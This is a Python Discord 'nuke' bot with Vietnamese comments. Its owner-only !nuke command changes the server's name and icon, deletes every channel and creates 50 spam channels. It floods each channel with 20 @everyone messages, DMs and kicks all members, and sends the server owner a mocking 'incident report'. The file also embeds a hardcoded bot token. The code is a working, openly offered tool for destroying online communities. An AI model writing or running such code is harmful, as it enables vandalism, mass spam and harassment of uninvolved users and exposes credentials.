import discord
from discord.ext import commands
import asyncio
import os
from flask import Flask
from threading import Thread

# =========================================================================
# 1. WEB SERVER GIỮ BOT SỐNG 24/7 (RENDER / REPLIT / UPTIME)
# =========================================================================
app = Flask('')

@app.route('/')
def home():
    return "✅ Bot Nuke System đang hoạt động 24/7!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_web)
    t.daemon = True
    t.start()

keep_alive()

# =========================================================================
# 2. CẤU HÌNH BOT & PHÂN QUYỀN OWNER
# =========================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN") or "MTU1MjU4NTIxNTU4NTgxNjU3Ng.GqjybU._PIVOkCNokhBqGhnhMvStANn2xgwJ1lwFmD9F8"
OWNER_ID = 1475126394345361609  # ID Chủ sở hữu duy nhất được dùng lệnh

intents = discord.Intents.default()
intents.message_content = True  
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# --- HÀM KIỂM TRA QUYỀN OWNER ---
def owner_only():
    async def predicate(ctx):
        if ctx.author.id != OWNER_ID:
            try:
                await ctx.message.delete()
            except:
                pass
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print("==================================================")
    print(f"✅ ĐÃ ĐĂNG NHẬP BOT NUKE THÀNH CÔNG: {bot.user.name}")
    print(f"🔒 Phân quyền Owner tuyệt đối cho ID: {OWNER_ID}")
    print("==================================================")

# =========================================================================
# 3. LỆNH NUKE TOÀN DIỆN (TỐC ĐỘ SIÊU TỐC - 50 KÊNH, 20 TIN NHẮN)
# =========================================================================
@bot.command(name="nuke")
@owner_only()
async def cmd_nuke(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    print(f"[*] Bắt đầu thực thi chuỗi Nuke tốc độ siêu tốc...")

    # 1. Đổi ảnh server tự động từ file ảnh có sẵn trong thư mục
    image_extensions = (".png", ".jpg", ".jpeg", ".webp")
    image_path = None
    for file in os.listdir("."):
        if file.lower().endswith(image_extensions):
            image_path = file
            break
    
    if image_path:
        try:
            with open(image_path, "rb") as img_file:
                icon_bytes = img_file.read()
                await ctx.guild.edit(icon=icon_bytes)
                print(f"[+] Đã đổi ảnh server thành công từ file: {image_path}")
        except Exception as e:
            print(f"[-] Lỗi đổi ảnh server: {e}")

    # 2. Đổi tên server từ file ten.txt
    if os.path.exists("ten.txt"):
        try:
            with open("ten.txt", "r", encoding="utf-8") as f:
                lines = [line.strip() for line in f if line.strip()]
                if lines:
                    server_name = lines[0]
                    await ctx.guild.edit(name=server_name)
                    print(f"[+] Đổi tên server thành công thành: {server_name}")
        except Exception as e:
            print(f"[-] Lỗi đổi tên server: {e}")

    # 3. Đọc danh sách tên kênh từ file ten.txt
    channel_names = []
    if os.path.exists("ten.txt"):
        try:
            with open("ten.txt", "r", encoding="utf-8") as f:
                channel_names = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Lỗi đọc tệp ten.txt: {e}")
    
    if not channel_names:
        channel_names = ["senko-raid"]
        with open("ten.txt", "w", encoding="utf-8") as f:
            f.write("senko-raid")

    # 4. Đọc nội dung thông điệp spam từ file ngon.txt
    message_content = "@everyone @here Bot Nuke By Senko"
    if os.path.exists("ngon.txt"):
        try:
            with open("ngon.txt", "r", encoding="utf-8") as f:
                message_content = f.read().strip()
        except Exception as e:
            print(f"[-] Lỗi đọc tệp ngon.txt: {e}")
    else:
        with open("ngon.txt", "w", encoding="utf-8") as f:
            f.write("@everyone @here Bot Nuke By Senko🐳💦🔥")

    # 5. Đọc nội dung tin nhắn DM cho thành viên từ file loicuoi.txt
    dm_content = "Tạm biệt bạn! Server đã bị nuke."
    if os.path.exists("loicuoi.txt"):
        try:
            with open("loicuoi.txt", "r", encoding="utf-8") as f:
                dm_content = f.read().strip()
        except Exception as e:
            print(f"[-] Lỗi đọc tệp loicuoi.txt: {e}")
    else:
        with open("loicuoi.txt", "w", encoding="utf-8") as f:
            f.write("Tạm biệt! Đây là lời cuối từ Senko Edition.")

    # 6. Xóa toàn bộ kênh cũ đồng loạt ngay lập tức
    all_channels = ctx.guild.channels
    if all_channels:
        print(f"[*] Đang xóa đồng loạt {len(all_channels)} kênh/danh mục cũ...")
        delete_tasks = [ch.delete() for ch in all_channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 7. Tạo 50 kênh mới siêu tốc (Chia batch song song cực nhanh không giật lag)
    print(f"[*] Đang tạo 50 kênh mới tốc độ siêu tốc...")
    created_channels = []
    
    async def create_single_channel(name):
        try:
            ch = await ctx.guild.create_text_channel(name)
            return ch
        except:
            return None

    # Tạo đồng thời các batch để vừa đạt tốc độ tối đa vừa tránh khóa 429
    batch_size = 25
    for i in range(0, 50, batch_size):
        batch_names = [channel_names[(j) % len(channel_names)] for j in range(i, min(i + batch_size, 50))]
        results = await asyncio.gather(*(create_single_channel(name) for name in batch_names), return_exceptions=True)
        for ch in results:
            if isinstance(ch, discord.TextChannel):
                created_channels.append(ch)
        await asyncio.sleep(0.02)

    # 8. Chuẩn bị file ảnh cho Embed
    embed_image_url = "attachment://raid_img.png" if image_path else None

    # 9. Gửi liên tục 20 tin nhắn Embed vào tất cả các kênh đồng loạt cực nhanh
    print(f"[*] Đang spam 20 tin nhắn đồng loạt vào tất cả các kênh...")
    send_tasks = []
    
    for ch in created_channels:
        if isinstance(ch, discord.TextChannel):
            for _ in range(20):
                embed = discord.Embed(
                    description=message_content,
                    color=0x2b2d31
                )
                if embed_image_url:
                    embed.set_image(url=embed_image_url)
                embed.set_footer(text=message_content)

                if image_path:
                    current_file = discord.File(image_path, filename="raid_img.png")
                    send_tasks.append(ch.send(content=message_content, embed=embed, file=current_file))
                else:
                    send_tasks.append(ch.send(content=message_content, embed=embed))

    if send_tasks:
        # Gửi tin nhắn theo cụm song song siêu tốc
        for i in range(0, len(send_tasks), 40):
            chunk = send_tasks[i:i+40]
            await asyncio.gather(*chunk, return_exceptions=True)
            await asyncio.sleep(0.02)

    # 10. Gửi DM Embed ngầu và Kick toàn bộ thành viên đồng loạt
    print(f"[*] Đang tiến hành gửi DM Embed và kick toàn bộ thành viên...")
    members = ctx.guild.members
    
    async def process_member(member):
        if member.bot or member.id == bot.user.id or member.id == ctx.author.id:
            return
        # Gửi DM dạng Embed ngầu
        try:
            dm_ch = await member.create_dm()
            embed_dm = discord.Embed(
                title="⚡ SYSTEM PROTOCOL // EXECUTED",
                description=dm_content,
                color=0x990000
            )
            embed_dm.set_footer(text="Senko Nuke Engine • No Mercy")
            if image_path:
                current_file = discord.File(image_path, filename="raid_img.png")
                embed_dm.set_image(url="attachment://raid_img.png")
                await dm_ch.send(embed=embed_dm, file=current_file)
            else:
                await dm_ch.send(embed=embed_dm)
        except:
            pass
        
        # Kick thành viên
        try:
            await member.kick(reason="Nuke By Senko Edition")
        except:
            pass

    member_tasks = [process_member(m) for m in members]
    if member_tasks:
        for i in range(0, len(member_tasks), 30):
            chunk = member_tasks[i:i+30]
            await asyncio.gather(*chunk, return_exceptions=True)
            await asyncio.sleep(0.05)

    # 11. Gửi tin nhắn DM tổng kết cực ngầu cho Owner và Chủ Server
    print(f"[*] Đang gửi tin nhắn tổng kết tối cao cho Owner và Chủ Server...")
    
    targets = set()
    if ctx.guild.owner:
        targets.add(ctx.guild.owner)
    
    bot_owner = bot.get_user(OWNER_ID)
    if not bot_owner:
        try:
            bot_owner = await bot.fetch_user(OWNER_ID)
        except:
            bot_owner = ctx.author
    if bot_owner:
        targets.add(bot_owner)

    for target in targets:
        try:
            dm_channel = await target.create_dm()
            embed_owner = discord.Embed(
                title="🚨 SECURITY INCIDENT REPORT // SENKO ENGINE",
                description=(
                    "### 💀 SERVER ĐÃ BỊ THANH TRỪNG\n"
                    "> **Server của bạn vừa trải qua một cuộc tổng tấn công triệt để bởi hệ thống Nuke.**\n\n"
                    "**# Server bạn bị nuke bởi bot nuke by senko khuyên bạn quản lí lại all role và thành viên cho role đây là kinh nghiệm cho bạn**\n\n"
                    "**📌 LỜI KHUYÊN AN NINH & KINH NGHIỆM:**\n"
                    "• **Rà soát lại toàn bộ Roles:** Kiểm tra kỹ các quyền hạn đặc biệt (đặc biệt là quyền *Administrator*).\n"
                    "• **Kiểm soát Bot ngoài:** Không cấp quyền vô tội vạ cho các ứng dụng không rõ nguồn gốc.\n\n"
                    "*Đây là bài học kinh nghiệm xương máu giúp bạn quản trị hệ thống chặt chẽ hơn!*"
                ),
                color=0xff0000
            )
            embed_owner.set_footer(text="Senko Edition • Security & Audit Protocol")
            
            if image_path:
                current_file = discord.File(image_path, filename="raid_img.png")
                embed_owner.set_image(url="attachment://raid_img.png")
                await dm_channel.send(embed=embed_owner, file=current_file)
            else:
                await dm_channel.send(embed=embed_owner)
        except Exception as e:
            print(f"[-] Không thể gửi DM tổng kết cho {target.name}: {e}")

    print(f"[✓] Hoàn tất toàn bộ chuỗi Nuke toàn diện thành công!")

# =========================================================================
# 4. KHỞI CHẠY BOT
# =========================================================================
if __name__ == "__main__":
    try:
        bot.run(BOT_TOKEN)
    except KeyboardInterrupt:
        print("\nĐã tắt bot thành công.")